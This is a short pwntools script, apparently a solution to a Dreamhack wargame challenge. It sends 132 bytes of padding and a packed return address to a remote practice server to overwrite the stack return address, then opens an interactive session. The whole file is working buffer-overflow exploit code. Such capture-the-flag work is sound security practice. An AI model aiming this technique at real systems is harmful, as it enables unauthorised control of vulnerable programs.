from pwn import *

host = "host8.dreamhack.games"
port = 10668

r = remote(host,port)

payload = b"A"*132 + p32(0x80485b9)

r.sendline(payload)

r.interactive()





